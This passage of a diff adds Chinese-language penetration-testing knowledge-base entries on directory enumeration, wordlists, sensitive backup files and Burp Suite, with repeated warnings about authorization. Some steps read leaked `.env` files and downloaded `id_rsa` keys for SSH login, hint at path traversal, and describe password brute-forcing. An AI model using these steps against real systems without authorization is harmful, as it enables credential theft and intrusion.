+          "summary": "目录枚举寻找隐藏后台、备份文件与接口，三款工具命令结构相似，选一款熟练即可，重点是字典。",
+          "content": "\n#### 这个条目的作用\n端口和服务只是「门面」，后台、备份文件、接口文档这些真正有价值的东西通常藏在没有链接的目录里。目录扫描就是逐个猜路径：把字典里的每一个名字拼到 URL 后面发请求，看哪个返回 200/301/403。三款工具原理相同、命令结构相似，选一款熟练即可，重点是字典选得对不对。\n\n#### 前置条件\n- 目标 URL（`http://target.com`）。\n- 一款目录扫描工具：Kali 自带 dirsearch/gobuster；ffuf 可用 `sudo apt install ffuf` 安装。\n- 字典文件：`/usr/share/wordlists/dirb/common.txt` 等（详见 wordlist-keys 条目）。\n- 授权与节奏意识：目录扫描会产生大量请求，敏感目标限速。\n\n#### 第 1 步：dirsearch 基础扫描（功能全面，首选）\n```bash\ndirsearch -u http://target.com -e php,html,txt -x 403,404 -t 50 --random-agent -o result.txt\n```\n- `-u` 目标；`-e` 追加常见扩展名（php,html,txt 等）；`-x` 过滤 403/404 噪音；`-t 50` 线程；`--random-agent` 随机 UA；`-o` 保存结果。\n- 预期结果：滚动输出 `[200] /admin/`、`[301] /backup/` 之类命中行，最后汇总到 result.txt。\n- 如果目标有登录页会跳转，加 `--cookie \"session=xxx\"` 带上已登录会话再扫。\n\n#### 第 2 步：ffuf 高速扫描（大字典场景）\n```bash\nffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403 -t 100\n```\n- `FUZZ` 是占位符，字典里的每个词会替换进去；`-mc` 只显示指定状态码；`-t 100` 并发。\n- 预期结果：每个命中一行，格式 `[Status: 200, Size: 1234]  admin`。\n- ffuf 是三款里最快的，适合几万行的大字典；但它默认不带扩展名，扫备份文件要自己拼，例如用 `-w dict:EXT` 组合。\n\n#### 第 3 步：gobuster 轻量稳定（简单场景）\n```bash\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt,zip -t 50\n```\n- `-x` 指定扩展名后缀列表（自动拼 .php/.bak/.txt/.zip 再扫一遍）；`-k` 忽略自签名证书错误（HTTPS 报证书错时加）。\n- 预期结果：命中行格式 `Found: /config.php (Status: 200)`。\n- 对比：dirsearch 开箱即用带过滤，ffuf 最快最灵活，gobuster 最轻（单文件、无依赖）。\n\n#### 第 4 步：递归扫描（找到目录后继续往下挖）\n```bash\ndirsearch -u http://target.com/admin/ -r -e php\n```\n- `-r` 递归：对发现的目录再跑一遍扫描，一层层往下。\n- 也可以手动指定子目录扫：`dirsearch -u http://target.com/backup/`。\n- 预期结果：`/admin/` 下又发现 `/admin/upload.php`、`/admin/config.php` 等，攻击面扩大。\n\n#### 第 5 步：结果分析\n打开 result.txt，按价值排序：优先看\n- 200 且路径可疑的（upload、backup、config、api）；\n- 带版本信息的目录（/v1/、/v2/）；\n- 源码类（/.git/、/.env、/swagger/）。\n先手动用浏览器或 curl 访问确认，再决定下一步利用。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 全 403/404，几乎无命中 | 目标有 WAF 或做了目录白名单 | 换 `--random-agent`、限速，或用 ffuf 换字典再试 |\n| 扫出大量 200 但访问都是同一个页面 | 前端路由把一切请求都返回 index.html | 看响应长度（Size）过滤，或用状态码 + 长度双重判断 |\n| HTTPS 证书报错中断 | 自签名证书 | gobuster 加 `-k`；dirsearch 加 `-k`（`--insecure`） |\n| 有登录页导致误判 | 未认证请求全被重定向到 login | 加 Cookie/Authorization 头再扫 |\n| 扫描被目标封 IP | 线程太高或 UA 特征明显 | `-t 10` 限速 + `--random-agent`，必要时换代理 |\n\n#### 实战要点\n- 字典 > 工具：三款工具结果差异不大，命中率主要看字典（见 wordlist-keys 条目）。\n- 先小字典快扫（common.txt 几分钟出结果），命中目录后再用大字典或自定义组合递归。\n- 观察响应 Size：很多站所有不存在的路径都返回同一页面，Size 相同的都是噪音，ffuf 用 `-fs 1234` 直接过滤。\n- 备份/源码类路径命中一个就值回票价（/www.zip、/.git/），优先级最高。\n- 目录扫描会留大量访问日志，敏感目标注意 `--random-agent`、限速与授权。\n\n> [!tip] ffuf 支持多占位符组合：`ffuf -u http://host/FUZZ?key=KEY -w dict1:FUZZ -w dict2:KEY`。\n\n> [!warn] 目录扫描会留下大量访问日志，敏感目标注意 `--random-agent`、限速与授权。"
+        },
+        {
+          "id": "wordlist-keys",
+          "title": "字典要点与词表分类",
+          "tags": [
+            "wordlist",
+            "dictionary",
+            "backup",
+            "api"
+          ],
+          "aliases": [
+            "字典",
+            "词表"
+          ],
+          "difficulty": "easy",
+          "summary": "字典质量决定枚举效果，通用大字典命中率低，按功能分类的组合词表才有效。",
+          "content": "\n#### 这个条目的作用\n目录扫描的本质是「用字典猜路径」，字典质量直接决定枚举效果。通用大字典（几十万词）命中率低又慢；按功能分类的小组合词表（后台词、备份词、接口词）往往几百个词就出结果。本条目讲清楚字典的分类逻辑与组合策略。\n\n#### 前置条件\n- 已装目录扫描工具（见 dir-search 条目）。\n- 知道系统字典路径：Kali 下 `/usr/share/wordlists/`（含 dirb、dirbuster 子目录），SecLists 通常在 `/usr/share/seclists/`（未装可用 `sudo apt install seclists`）。\n\n#### 第 1 步：认识系统自带字典\n```bash\nls /usr/share/wordlists/dirb/            # common.txt、big.txt 等\nls /usr/share/wordlists/dirbuster/       # directory-list-2.3-medium.txt 等\nwc -l /usr/share/wordlists/dirb/common.txt\n```\n- 预期结果：common.txt 约 4600 行（小字典，秒扫）、directory-list-2.3-medium.txt 约 22 万行（大字典，要等）。\n- 使用原则：先小后大。common.txt 快扫定位，medium 字典针对重点目录补扫。\n\n#### 第 2 步：按功能分类的词表（自己拼也很快）\n| 分类 | 关键词示例 |\n|---|---|\n| 后台管理 | admin, manage, manager, system, console, backend, dashboard, control |\n| 上传下载 | upload, uploads, file, files, download, attachments, static, media |\n| 备份 | backup, bak, old, temp, test, www.zip, site.zip, data.zip |\n| 接口类 | api, v1, v2, swagger, graphql, openapi, docs, endpoints, json |\n| 源码泄露 | .git, .svn, .hg, .env, .DS_Store, config, phpinfo |\n| 常见脚本 | index, login, register, user, users, install, setup |\n| 运维 | status, health, metrics, monitor, debug, phpmyadmin, jenkins |\n\n用法：把这列词每行一个存成 `my_dict.txt`，直接喂给扫描工具。也可以把同类词和扩展名组合（如备份类 + .zip/.bak/.sql）。\n\n#### 第 3 步：组合策略——按目标类型选词\n- 找后台：admin 打头 + 常见后台词表 → `dirsearch -u http://target.com -w admin_dict.txt`。\n- 找备份：直接在站点根目录扫常见备份文件名（www.zip、backup.zip、db.sql 等，见 backup-files 条目）。\n- 找接口：api + v1/v2 + swagger 文档名组合 → 命中 `/api/v1/`、`/swagger-ui.html` 直接扩大攻击面。\n\n#### 第 4 步：给字典加料（站点定制）\n把目标域名、站点目录名、公司/产品名加进字典：\n```bash\n# 目标域名 target.com，站点目录 /var/www/html/target\necho -e \"target\\nwww.target.com\\ntarget.zip\\ntarget.com.zip\\nsite\\nhtml\\nwebroot\" >> my_dict.txt\n```\n- 理由：备份文件常以站点名/域名命名（target.zip、www.target.com.zip），这是通用字典永远猜不到的。\n- 预期结果：`/target.zip` 或 `/target.bak` 之类命中，往往直接是整站源码备份。\n\n#### 第 5 步：递归与组合使用\n找到目录后不要停：`dirsearch -u http://target.com/admin/ -r -e php` 递归往下扫；同时把新发现的目录名（如 `uploads`）加进字典继续扫它的子路径。接口版本目录（/api/v1/）也要单独扫一遍。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 大字典扫很久没结果 | 字典太大、线程低 | 先用 common.txt 快扫，再针对目录用小组合词表 |\n| 词表里没有带扩展名的条目 | 扫描工具默认不拼扩展名 | 用工具 `-e` 参数（dirsearch）或 `-x` 参数（gobuster）自动追加 |\n| 备份文件扫不到 | 字典没有站点名 | 把域名、目录名加进字典（第 4 步） |\n| 接口路径全 404 | 接口有统一前缀或网关 | 先看 JS/网络请求找真实前缀，再定向扫 |\n\n#### 实战要点\n- 字典质量 > 工具选择：三款工具（dirsearch/ffuf/gobuster）用同一字典结果几乎一样。\n- 「后台 + 备份 + 接口」是三个最高价值方向，每个方向准备一组 20-50 词的小表就够了。\n- 站点定制的词（域名、产品名、目录名）是命中备份文件的关键，通用字典在这方面完全无力。\n- 接口词命中 `/api/v1/`、`/swagger` 后，接着用 json/endpoints 词扫子路径，往往能直接翻到未授权接口。\n- 扫描是「先快后细」：common 小字典全局扫 → 命中目录用大字典/递归补扫 → 高价值目录用手工组合词表精扫。\n\n> [!tip] 先用小字典（dirb common、SecLists common.txt）快扫，再针对发现的目录做递归与自定义组合扫描。"
+        },
+        {
+          "id": "backup-files",
+          "title": "常见备份与敏感文件清单",
+          "tags": [
+            "backup",
+            "leak",
+            "source"
+          ],
+          "aliases": [
+            "备份文件",
+            "源码泄露"
+          ],
+          "difficulty": "easy",
+          "summary": "备份与敏感文件是信息收集捷径，命中一个就可能直接拿到源码或配置。",
+          "content": "\n#### 这个条目的作用\n备份与敏感文件是信息收集的捷径：一个 `www.zip` 可能就是整站源码，一个 `.env` 可能就是数据库口令，一个 `.git/` 泄露就能还原全部代码。这类文件不需要任何漏洞，只要存在就是独立的信息泄露漏洞，也是后续 getshell 的跳板。\n\n#### 前置条件\n- 目标 URL（`http://target.com`）。\n- 目录扫描工具或 curl（手工验证用）。\n- 明确授权：发现 `.git`、`.env` 属于严重信息泄露，可独立上报。\n\n#### 第 1 步：手工直连最常见的备份文件名\n先手工试最经典的几个（浏览器地址栏或 curl 都行）：\n```bash\ncurl -I http://target.com/www.zip\ncurl -I http://target.com/backup.zip\ncurl -I http://target.com/.env\ncurl -I http://target.com/.git/config\n```\n- 预期结果：`HTTP/1.1 200 OK` 且有 `Content-Length` 就是存在；`404` 则没有。`.git/config` 返回 200 说明存在 git 泄露，直接下载看内容。\n\n#### 第 2 步：用扫描工具批量扫完整清单\n把下面清单存成 `backup.txt` 喂给目录扫描工具：\n```txt\n# 压缩包备份\nwww.zip  web.zip  site.zip  backup.zip  bak.zip  data.zip  code.zip  html.zip\n1.zip  2.zip  test.zip  temp.zip  old.zip  wwwroot.zip  www.rar  site.rar\n\n# 数据库备份\ndb.sql  database.sql  data.sql  dump.sql  backup.sql  mysql.sql  sql.zip\n\n# 源码与配置泄露\nindex.php.bak  index.php~  index.php.swp  config.php.bak  .env\nweb.config  .git/config  .svn/entries  .DS_Store  phpinfo.php  test.php\nid_rsa  id_dsa  authorized_keys  .bash_history  .mysql_history\n\n# 编辑器残留\n.vscode/  .idea/  *.swp  *.swo  *.~  *~\n```\n```bash\ndirsearch -u http://target.com -w backup.txt -x 403,404 -t 30 --random-agent\n```\n- 注意：`.git/config`、`.DS_Store` 这类以点开头的路径，部分工具默认忽略隐藏文件，dirsearch 需确认字典里保留了点号开头行。\n- 预期结果：命中的敏感文件按第 3 步逐一验证。\n\n#### 第 3 步：下载并验证命中文件\n```bash\ncurl -O http://target.com/www.zip\nfile www.zip              # 确认是 zip：Zip archive data\nunzip -l www.zip | head   # 列出内容，先看结构\n```\n- 预期结果：`www.zip` 是合法压缩包且包含 PHP 源码 → 直接解压审计源码，找配置里的数据库口令、硬编码密钥、隐藏接口。\n- 数据库备份 `db.sql` 同理：`head -50 db.sql` 看表结构，搜 `INSERT INTO` 找明文账号密码。\n\n#### 第 4 步：.git 泄露专项处理\n`.git/config` 存在说明整个 `.git` 目录可访问，用专用工具把源码「还原」出来：\n```bash\n# GitHack（经典工具，克隆下来即可用）\npython3 GitHack.py http://target.com/.git/\n```\n- 预期结果：脚本逐个下载 `.git` 对象并还原出工作区源码，输出源码目录。\n- 没有工具时手工验证：`curl http://target.com/.git/HEAD` 返回 `ref: refs/heads/master` 即确认存在。\n- 还原出的源码直接做代码审计（见 source-code-audit 技能），找注入、上传、认证缺陷。\n\n#### 第 5 步：其他敏感文件验证\n- `phpinfo.php`：存在即泄露 PHP 配置与系统信息，`curl http://target.com/phpinfo.php` 确认。\n- `.env`：存在即泄露环境变量（数据库口令、密钥），`curl http://target.com/.env` 直接看。\n- `id_rsa`：私钥泄露，下载后 `chmod 600 id_rsa && ssh -i id_rsa user@IP` 尝试 SSH 登录。\n- `.bash_history` / `.mysql_history`：泄露历史命令，可能含口令与内网信息。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 手工访问返回 403 | 文件存在但禁止下载 | 换 UA、加 Referer 头，或从别的路径引用（如 ../../ 穿越） |\n| 扫描工具跳过 `.git` 这类点开头路径 | 工具默认忽略隐藏文件 | 确认字典行保留点号，或用 gobuster 直接指定路径 |\n| 下载的 zip 解压报错 | 伪 200（所有路径都返回同一页） | 对比 Content-Length：真实文件体积大且是二进制，伪 200 通常是 HTML |\n| `.git` 存在但 GitHack 还原失败 | 服务器过滤了 `.git` 子路径 | 用 `git` 客户端配 `GIT_DIR` 手工拉取，或换 githacker 等工具 |\n| 备份文件里有源码但找不到口令 | 配置用了环境变量 | 搜 `.env`、`config/*.php`、`settings.py`，口令常在配置文件里 |\n\n#### 实战要点\n- 优先级：`.git/`、`.env`、`www.zip` 三件套命中任何一个都是「严重信息泄露」级别的发现，独立可报。\n- 备份文件命名套路：站点名/域名 + zip/bak/sql（target.zip、www.target.com.zip），把域名加进字典（见 wordlist-keys 条目）。\n- 下载任何备份先 `file` 验证类型，伪 200（全是 HTML 的站）会浪费大量时间。\n- 拿到源码 = 拿到攻击面全景：代码审计找注入与上传点，配置找口令与内网地址，通常直接通向 getshell。\n- 编辑器残留（.swp/.bak/~）常见于开发者未清理的站点，命中概率不低且零成本验证。\n\n> [!tip] 备份文件常以站点名、域名命名，扫描时把目标域名和站点目录名加进字典。\n\n> [!danger] 拿到 `.git` 或 `.env` 属于严重信息泄露，可作为独立漏洞上报，也是后续 getshell 的跳板。"
+        },
+        {
+          "id": "dirsearch-guide",
+          "title": "dirsearch 完整教程——从安装到扫穿靶机（零基础 7 步）",
+          "tags": [
+            "dirsearch",
+            "目录扫描",
+            "枚举",
+            "字典",
+            "安装",
+            "排错"
+          ],
+          "aliases": [
+            "dirsearch教程",
+            "dirsearch安装",
+            "dirsearch参数",
+            "dirsearch 用法",
+            "dirsearch windows",
+            "目录扫描工具",
+            "dirsearch怎么用",
+            "dirsearch全参数"
+          ],
+          "difficulty": "easy",
+          "summary": "零基础 7 步：dirsearch 是什么、Windows/Linux 怎么装（含国内镜像）、第一个扫描长什么样、每个参数逐个讲、怎么看懂结果、真实题目完整实战、踩坑排错表。照着抄就能扫穿大多数靶机。",
+          "content": "\n#### 这个条目的作用\n一句话：dirsearch 是一个「自动替你猜网站里藏着什么文件/目录」的命令行工具。你把网址给它，它拿着一个**字典**（几千上万条常见路径名），一条一条地问服务器「这个路径存在吗？」，然后把**存在的**都列给你看。\n\n为什么要用它？因为网站的隐藏文件你**没法用鼠标点出来**——`shell.php`、`backup.zip`、`.git/config`、`admin/login.php` 这些不会出现在首页上，但服务器上就是有。手工一个个试网址 = 大海捞针；dirsearch = 拿吸铁石过一遍，几秒到几分钟把整个沙滩的针都吸出来。\n\n> [!info] 类比：浏览器是「逛商场」，你只能看到店铺挂出来的招牌；dirsearch 是「拿着商场物业的钥匙挨个开房间」，把每个门后面藏着什么全翻出来。\n\n#### 前置条件\n- 一台电脑，能打开终端（黑窗口）。\n- 一个**你被授权测试**的目标地址（自己搭的靶机、CTF 比赛靶机、授权的渗透测试目标）。**不要拿它扫你没权限的网站**，目录扫描会留下大量访问日志。\n- dirsearch 本身（第 1 步教你装）。\n\n#### 第 1 步：安装（Windows 看这里，别去 GitHub 硬刚）\ndirsearch 是一个 Python 工具，装它最省事的方式是 pip（Python 的软件管家）。**先确认有 Python**，终端里输入：\n```bash\npython --version\n```\n看到 `Python 3.x.x` 就继续。然后**直接装**（这是关键：很多人卡在 GitHub clone 被墙，pip 国内源又快又稳）：\n```bash\npython -m pip install dirsearch -i https://pypi.tuna.tsinghua.edu.cn/simple\n```\n- `-i https://pypi.tuna.tsinghua.edu.cn/simple`：指定清华镜像源。**国内网络直连官方源大概率超时，这一句别省**。\n- 装完验证：\n```bash\ndirsearch --version\n```\n能看到版本号（如 `0.5.0`）就装好了，直接跳到第 2 步。\n\n其他安装方式（备选）：\n| 方式 | 命令 | 什么时候用 |\n|---|---|---|\n| pip 清华源（推荐） | `python -m pip install dirsearch -i https://pypi.tuna.tsinghua.edu.cn/simple` | Windows / Linux 通用，最快最稳 |\n| GitHub clone | `git clone https://github.com/maurosoria/dirsearch.git && cd dirsearch && python dirsearch.py -u http://x` | 网络能直连 GitHub 时；被墙/被重置就别挣扎了，用 pip |\n| Kali / Debian / Ubuntu | `sudo apt install dirsearch` | Linux 上 apt 源里有就直接装 |\n\n> [!warn] GitHub clone 报 `Recv failure: Connection was reset` = 直连被墙，换 pip 清华源，别再重试 clone。\n> [!tip] 装了新版（0.5.x+）后命令名就是 `dirsearch`；老教程里的 `python dirsearch.py` 只在 clone 源码方式下用。\n\n#### 第 2 步：发出第一个扫描，看懂输出\n终端里输入（`http://target.com` 换成你的目标）：\n```bash\ndirsearch -u http://target.com -e php\n```\n输出长这样（以 0.5.0 为例）：\n```txt\nExtensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9611\n\nTarget: http://target.com\n\n[12:00:01] 200 -    0B  - /index.php\n[12:00:02] 301 -  178B  - /admin  ->  /admin/\n[12:00:02] 403 -  199B  - /server-status\n[12:00:05] 200 - 1.2KB  - /shell.php\n\nTask Completed\n```\n每一行的意思是：\n| 部分 | 含义 |\n|---|---|\n| `[12:00:02]` | 发现时间（不必关心） |\n| `200 / 301 / 403...` | **状态码**，这是重点（第 4 步细讲） |\n| `0B / 178B / 1.2KB` | 响应大小，越大越可能是真东西 |\n| `/shell.php` | 发现的路径 |\n| `-> /admin/` | 301 跳转到哪 |\n\n> [!info] 屏幕第一行 `Wordlist size: 9611` = 这次要猜 9611 个路径；`Threads: 25` = 默认同时发 25 个请求。Target 下面的空行之后，**每扫到一个存在的东西就打印一行**。\n> [!tip] 新手最常见的困惑「怎么扫完什么都没显示？」——要么目标真没东西（不太可能），要么 404 刷屏把有用的淹了，见第 3 步的 `-x 404`。\n\n#### 第 3 步：参数逐个讲（背这张表就够）\ndirsearch 的万能句式：\n```txt\ndirsearch -u 目标 [其他参数们]\n```\n`-u` 是唯一必填参数，其他都是可选的开关，顺序无所谓：\n\n| 参数 | 作用 | 最常用例子 | 说明 |\n|---|---|---|---|\n| `-u 网址` | 目标（必填） | `-u http://target.com` | 打靶机记得带端口：`-u http://1.2.3.4:8080` |\n| `-e 扩展名` | 要追加探测哪些后缀 | `-e php,html,txt,zip,bak` | 不加它只扫无后缀路径。PHP 靶机优先 `-e php`，再加 `bak,zip,txt` 找备份 |\n| `-w 字典文件` | 自定义字典 | `-w my_dict.txt` | 默认字典 9000+ 条；按场景换字典（后台/备份/接口词表），见知识库「字典要点」条目 |\n| `-t 数字` | 线程数（同时发多少请求） | `-t 5` | 默认 25。**小靶机请降到 5-10**，25 线程可能把靶机扫崩（第 6 步有真实案例） |\n| `-x 状态码` | 排除（不显示）这些状态码 | `-x 404,403` | 最常用的净化参数，把无意义的 404 刷屏过滤掉 |\n| `-i 状态码` | 只显示这些状态码 | `-i 200,301,302` | 和 `-x` 反着来，只看「存在」的 |\n| `-r` | 递归：扫到目录后自动扫它的子目录 | `-r` | 扫到 `/admin` 会继续扫 `/admin/xxx`；目录深的站很费时 |\n| `--random-agent` | 每个请求随机 UA | `--random-agent` | 伪装成浏览器，防被 WAF/日志按 UA 拦截 |\n| `-k` | 跳过 HTTPS 证书检查 | `-k` | 靶机自签名证书必备，不加会 SSL 报错中断 |\n| `-o 文件` | 结果存文件 | `-o result.txt` | **强烈建议加上**：终端输出会被进度条刷乱，存文件最稳 |\n| `--timeout 秒` | 单请求超时 | `--timeout 10` | 目标慢时防止卡死 |\n| `-m 秒` | 每个请求间隔（限速） | `-m 2` | 对敏感目标降速，别把服务器打挂 |\n\n一个组合好的「打靶标准命令」：\n```bash\ndirsearch -u http://target.com -e php,html,txt,zip,bak -t 10 -x 404 -k --random-agent -o result.txt\n```\n拆解：扫 PHP 靶机常见后缀 → 10 线程（不欺负小服务器）→ 过滤掉 404 → 跳过证书检查 → 随机 UA → 结果落盘。\n\n> [!warn] 版本差异：`--format`（输出格式）、`--min-response-size`（过滤过小响应）等参数是**较新版本**才有的。pip 装的 0.5.0 没有 `--format`，用了会直接报 `no such option`。拿不准就先 `dirsearch --help` 看当前版本支持哪些参数，比记网上的旧教程靠谱。\n> [!tip] 扫描前先看一眼目标用什么语言/框架（见知识库「指纹识别」条目），再定 `-e`：PHP 站扫 `php`，Java 站扫 `jsp,do`，Node 站扫 `js,json`。\n\n#### 第 4 步：看懂结果——状态码速查表\n扫描结果里最重要的就是状态码，看到就照表行动：\n\n| 状态码 | 含义 | 下一步 |\n|---|---|---|\n| `200` | 存在且可直接访问 | **逐个打开看内容**，大概率有料（flag、备份、后台） |\n| `301 / 302` | 存在，会跳转到别处 | 记下 `->` 箭头指的地址，跟着去 |\n| `401` | 存在，要登录认证 | 记下来，试试弱口令/默认密码 |\n| `403` | 存在，但禁止访问 | 别急着放弃：可能是目录（试试 `-r` 递归扫里面），也可能是配置错误 |\n| `500` | 存在，服务器处理报错 | 访问一下看报错信息，可能泄露路径/技术栈 |\n| `404` | 不存在 | 正常噪音，扫的时候用 `-x 404` 过滤掉 |\n\n判断口诀：**状态码 < 400 的都值得点开看一眼**；`200` 的 `php/bak/zip` 文件优先看——`shell.php`、`backup.zip`、`index.php.bak` 这类名字本身就是在告诉你答案。\n\n> [!info] 响应大小也有用：`1.2KB` 的 `shell.php` 和 `0B` 的 `index.php` 比，前者更像真内容。同样状态码下，体积反常的文件优先检查。\n\n#### 第 5 步：完整实战流程（真实题目演示）\n下面是一个真实发生过的流程（NEFU CTF 靶机，题目「flag 藏在 HTML 源码里」）：\n```bash\n# 1) 起手扫描：PHP 靶机，低线程防打崩，过滤 404，结果存文件\ndirsearch -u http://contest.ctf.nefu.edu.cn:31179/ -e php -t 5 -x 404 -o result.txt\n```\n结果里出现：\n```txt\n[12:00:05] 200 - 190B - /shell.php\n```\n```bash\n# 2) 直接打开发现的文件\ncurl http://contest.ctf.nefu.edu.cn:31179/shell.php\n```\n拿到：\n```html\nflag{8f5bf8ba-****-****-****-************}\n```\n**就这么简单**：题目的设计是让你手动点 201 层连环页面（每页藏一个字符拼出下一个文件名），但一个目录扫描 30 秒就把作者藏起来的 `shell.php` 直接扫出来了。**目录扫描永远排在手动探索前面。**\n\n标准打靶姿势：\n```bash\n# 第一遍：快速摸底（常见后缀）\ndirsearch -u http://target -e php,html,txt -t 10 -x 404 -o pass1.txt\n# 第二遍：按第一遍发现的线索换字典/递归（比如发现 /admin/ 就钻进去）\ndirsearch -u http://target/admin/ -e php -t 10 -x 404 -r -o pass2.txt\n# 第三遍：针对备份文件（很多题目备份文件名很随意，换备份词表）\ndirsearch -u http://target -w backup_words.txt -e zip,bak,txt -t 10 -x 404 -o pass3.txt\n```\n\n#### 第 6 步：踩坑与排错表\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 扫到一半服务器开始拒绝连接/超时，之后整个站都访问不了 | **线程太高把靶机打崩了**（25 线程 × 近万请求对本地小靶机是暴击） | 降到 `-t 5`；等靶机恢复再扫；以后默认 `-t 5~10` |\n| 结果文件是空的，但明明有文件 | 服务器中途挂掉/限流；或 404 之外的噪音把输出刷没 | 重扫；用 `-o` 存文件；降线程；加 `--timeout` |\n| GitHub clone 报 `Connection was reset` | 直连 GitHub 被墙 | 用 `pip install dirsearch -i https://pypi.tuna.tsinghua.edu.cn/simple` |\n| Windows PowerShell 里输出乱码/滚动条刷屏 | PowerShell 对管道输出处理不同 | 用 `-o 结果.txt` 存文件再 `Get-Content 结果.txt`；别盯着终端看 |\n| 报 `no such option: --format` | 版本太老，没这参数 | `dirsearch --help` 看当前版本支持什么；别抄网上新教程的冷门参数 |\n| 扫了很久一条都没扫到 | 字典不匹配 / 目标要求特定 UA / 目标挂了 | 换场景字典（后台/备份词表）；加 `--random-agent`；确认目标活着 |\n| HTTPS 目标报证书错误中断 | 自签名证书 | 加 `-k` |\n| 结果一堆 403 | 存在但禁止访问，不是没有 | 403 的目录试试 `-r` 递归；403 的文件换 UA/Referer 再访问 |\n| 找到文件但打开是 404 页面 | 服务器把未知路径全回 404 页面内容 | 看 `-x 404` 前原始状态码；以状态码为准，别信内容 |\n\n> [!warn] 最重要的一条：**别拿默认 25 线程扫你没把握的小靶机**。目录扫描的本质是高速发请求，靶机（尤其 CTF 本地环境）带宽和处理能力有限，扫崩了靶机，题也没了。`-t 5` 慢不了几分钟，但稳。\n> [!warn] 权限红线：目录扫描会留下大量访问日志，只对你有权限的目标用；大范围/公网扫描注意节奏（`--random-agent`、限速）。\n\n#### 实战要点\n- **起手式**：拿到靶机第一件事不是看页面，是 `dirsearch -u 目标 -e 对应后缀 -t 5 -x 404 -o 结果`。30 秒可能省下 1 小时的手工探索。\n- **字典 > 工具**：dirsearch、ffuf、gobuster 用同一字典结果差不多，选一个熟练即可；真正拉开差距的是按场景换字典（后台词表、备份词表、API 词表）。\n- **扫到目录别停**：`-r` 递归钻进去；把新发现的路径名加进字典继续扫。\n- **结果永远存文件**：`-o result.txt`，扫描完慢慢看，比被进度条刷乱的终端靠谱一百倍。\n- **和别的工具组合**：先 `nmap` 摸端口 → `dirsearch` 扫目录 → 发现线索后用 curl/Burp 验证（见 curl 教程）。四步下来，一道 Web 题的攻击面基本就出来了。"
+        }
+      ]
+    },
+    {
+      "id": "g-proxy",
+      "name": "代理与流量",
+      "intro": "抓包、改包、看流量",
+      "entries": [
+        {
+          "id": "burp-workflow",
+          "title": "Burp Suite 模块用途与流程",
+          "tags": [
+            "burp",
+            "proxy",
+            "repeater",
+            "intruder"
+          ],
+          "aliases": [
+            "burp",
+            "抓包",
+            "重放"
+          ],
+          "difficulty": "medium",
+          "summary": "Burp 是 Web 测试核心工具，掌握各模块定位即可高效完成拦截改包、重放、爆破与编解码。",
+          "content": "\n#### 这个条目的作用\nBurp Suite 是 Web 测试的「总控台」：浏览器把流量交给它，它负责拦截、查看、修改、重放、爆破。绝大多数 Web 漏洞（注入、越权、上传绕过）都要靠它改包才能验证。本条目把核心模块的定位和标准流程讲清楚：装好代理 → 抓包 → 送 Repeater 改包 → 送 Intruder 爆破。\n\n#### 前置条件\n- 已安装 Burp Suite Community/Pro（Kali 自带 Community 版）。\n- 一个测试浏览器（Chrome/Firefox 均可）。\n- 目标授权：Burp 的所有操作都是主动测试，确认你有权测试该目标。\n\n#### 第 1 步：配置浏览器代理\n1. 打开 Burp → `Proxy` 标签 → `Proxy settings`，确认监听地址是 `127.0.0.1:8080`（默认）。\n2. 浏览器设置代理：Chrome 装 SwitchyOmega 扩展，新建代理 profile，HTTP/HTTPS 都填 `127.0.0.1:8080`；或 Firefox → 设置 → 网络设置 → 手动代理 `127.0.0.1:8080`。\n3. 验证：浏览器访问 `http://example.com`，Burp 的 `Proxy -> HTTP history` 里出现该请求即代理生效。\n\n#### 第 2 步：安装 CA 证书（HTTPS 解密必需）\n1. 代理已生效时，浏览器访问 `http://burp`（或 `http://127.0.0.1:8080`），页面右上角点 `CA Certificate` 下载 `cacert.der`。\n2. 导入证书：Chrome → 设置 → 隐私和安全 → 安全 → 管理证书 → 导入，勾选「信任用于标识网站」；Firefox → 设置 → 隐私与安全 → 证书 → 查看证书 → 导入。\n3. 验证：访问任意 HTTPS 站点，Burp history 里能看到解密后的明文请求（不再显示 `CONNECT` 隧道行）。\n> 不装证书 HTTPS 流量只能看到 CONNECT 隧道，看不到 URL 和参数，等于白抓。\n\n#### 第 3 步：Proxy 抓包与手动改包\n1. `Proxy -> Intercept`，点 `Intercept is on`（变橙色即开启拦截）。\n2. 浏览器操作目标站点，请求到达 Burp 会被拦下。\n3. 在拦截面板里直接改请求（改参数、改 Cookie、改路径），点 `Forward` 放行；`Drop` 丢弃。\n4. 预期结果：改完的参数原样到达服务器，响应回来后可 `Forward` 继续或 `Action -> Do intercept -> Response` 改响应。\n> 拦截模式容易忘关导致浏览器卡住，练手时可用 HTTP history 模式：不拦截，全流量进历史记录，右键重放。\n\n#### 第 4 步：Target 设置 Scope 过滤噪音\n1. `Target -> Scope`，`Add` 目标域名（如 `target.com`）。\n2. `Target -> Site map` 只看 scope 内站点，HTTP history 底部勾 `Filter: Show only in-scope items`。\n3. 预期结果：流量列表只剩目标站点的请求，站内页面、JS、API 结构一目了然，攻击面梳理更清晰。\n\n#### 第 5 步：Repeater 手动重放（最常用）\n1. 在 HTTP history 里找到目标请求，右键 → `Send to Repeater`。\n2. `Repeater` 面板改任意参数（把 `id=1` 改成 `id=2` 测越权、改 SQL 注入 payload），点 `Send`。\n3. 预期结果：右侧返回响应，和上一次对比看差异（越权则返回了别的用户数据，注入则出现报错或时间差）。\n4. 批量测多个 payload 时配合 Intruder；测两个响应差异用 Comparer。\n\n#### 第 6 步：Intruder 自动化爆破\n1. 在请求里选中要爆破的参数（如 `password=admin`），右键 → `Add to Intruder`。\n2. `Positions` 页确认攻击位置（`§` 包围即生效）。\n3. `Payloads` 页加载字典（`Payload options` 里 Load，如 `rockyou.txt` 或用户名字典）。\n4. 点右上角 `Start attack`，结束后按 Response length / Status code 排序找异常项（登录成功通常长度不同）。\n> 社区版 Intruder 有速率限制，大字典爆破改用 ffuf 或脚本（见 dir-search、hydra 条目）。\n\n#### 第 7 步：其他模块速查\n| 模块 | 用途 |\n|---|---|\n| Proxy | 拦截与转发请求，抓包和手动改包 |\n| Target | 站点地图，梳理攻击面 |\n| Repeater | 手动重放与修改单个请求 |\n| Intruder | 